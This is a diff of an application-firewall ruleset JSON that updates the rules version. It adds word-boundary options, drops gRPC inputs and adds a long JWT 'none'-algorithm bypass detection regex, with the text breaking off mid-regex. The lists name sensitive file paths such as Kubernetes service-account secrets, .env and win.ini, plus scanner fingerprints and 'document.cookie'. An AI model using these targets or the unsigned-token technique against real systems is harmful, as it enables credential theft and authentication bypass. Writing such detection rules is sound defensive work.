@@ -1,10 +1,10 @@
 {
-  "scenario": "ruleset_1.10.0",
+  "scenario": "ruleset_1.13.0",
   "max_cycles": 1,
   "ruleset": {
     "version": "2.2",
     "metadata": {
-      "rules_version": "1.10.0"
+      "rules_version": "1.13.0"
     },
     "rules": [
       {
@@ -144,7 +144,10 @@
                 "appscan_fingerprint",
                 "w00tw00t.at.isc.sans.dfind",
                 "w00tw00t.at.blackhats.romanian.anti-sec"
-              ]
+              ],
+              "options": {
+                "enforce_word_boundary": true
+              }
             },
             "operator": "phrase_match"
           }
@@ -1781,7 +1784,10 @@
                 "windows\\win.ini",
                 "default\\ntuser.dat",
                 "/var/run/secrets/kubernetes.io/serviceaccount"
-              ]
+              ],
+              "options": {
+                "enforce_word_boundary": true
+              }
             },
             "operator": "phrase_match"
           }
@@ -1898,6 +1904,9 @@
                   "address": "graphql.server.resolver"
                 }
               ],
+              "options": {
+                "enforce_word_boundary": true
+              },
               "list": [
                 "${cdpath}",
                 "${dirstack}",
@@ -1915,7 +1924,6 @@
                 "$ifs",
                 "$oldpwd",
                 "$ostype",
-                "$path",
                 "$pwd",
                 "dev/fd/",
                 "dev/null",
@@ -2474,7 +2482,10 @@
                 "settings.local.php",
                 "local.xml",
                 ".env"
-              ]
+              ],
+              "options": {
+                "enforce_word_boundary": true
+              }
             },
             "operator": "phrase_match"
           }
@@ -2570,6 +2581,9 @@
                   "address": "graphql.server.resolver"
                 }
               ],
+              "options": {
+                "enforce_word_boundary": true
+              },
               "list": [
                 "$globals",
                 "$_cookie",
@@ -2768,7 +2782,10 @@
                 "wp_safe_remote_post",
                 "wp_safe_remote_request",
                 "zlib_decode"
-              ]
+              ],
+              "options": {
+                "enforce_word_boundary": true
+              }
             },
             "operator": "phrase_match"
           }
@@ -2984,9 +3001,6 @@
                   "address": "server.request.path_params"
                 },
                 {
-                  "address": "grpc.server.request.message"
-                },
-                {
                   "address": "graphql.server.all_resolvers"
                 },
                 {
@@ -3039,9 +3053,6 @@
                 },
                 {
                   "address": "server.request.path_params"
-                },
-                {
-                  "address": "grpc.server.request.message"
                 },
                 {
                   "address": "graphql.server.all_resolvers"
@@ -3274,6 +3285,9 @@
                   "address": "graphql.server.resolver"
                 }
               ],
+              "options": {
+                "enforce_word_boundary": true
+              },
               "list": [
                 "document.cookie",
                 "document.write",
@@ -3548,9 +3562,6 @@
                 },
                 {
                   "address": "server.request.path_params"
-                },
-                {
-                  "address": "grpc.server.request.message"
                 },
                 {
                   "address": "graphql.server.all_resolvers"
@@ -3865,9 +3876,6 @@
                 },
                 {
                   "address": "server.request.path_params"
-                },
-                {
-                  "address": "grpc.server.request.message"
                 },
                 {
                   "address": "graphql.server.all_resolvers"
@@ -4457,7 +4465,10 @@
                 "org.apache.struts2",
                 "org.omg.corba",
                 "java.beans.xmldecode"
-              ]
+              ],
+              "options": {
+                "enforce_word_boundary": true
+              }
             },
             "operator": "phrase_match"
           }
@@ -4583,9 +4594,6 @@
                 },
                 {
                   "address": "server.request.path_params"
-                },
-                {
-                  "address": "grpc.server.request.message"
                 },
                 {
                   "address": "graphql.server.all_resolvers"
@@ -5346,6 +5354,40 @@
         "transformers": []
       },
       {
+        "id": "dog-920-001",
+        "name": "JWT authentication bypass",
+        "tags": {
+          "type": "http_protocol_violation",
+          "category": "attack_attempt",
+          "cwe": "287",
+          "capec": "1000/225/115",
+          "confidence": "0"
+        },
+        "conditions": [
+          {
+            "parameters": {
+              "inputs": [
+                {
+                  "address": "server.request.cookies"
+                },
+                {
+                  "address": "server.request.headers.no_cookies",
+                  "key_path": [
+                    "authorization"
+                  ]
+                }
+              ],
+              "regex": "^(?:Bearer )?ey[A-Za-z0-9+_\\-/]*([QY][UW]x[Hn]Ij([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiAi[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]Ij([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDogI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]IiA6ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]Ij([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiAi[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciOiAi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciIDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgOiJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]IiA6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]Ij([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciOiJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgOiAi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]IjogI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]IiA6I[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6I[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6I[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciIDogI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]IiA6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]IiA6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ciO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6I[km]5[Pv][Tb][km][U-X]|[QY][UW]x[Hn]IiA6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ID([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9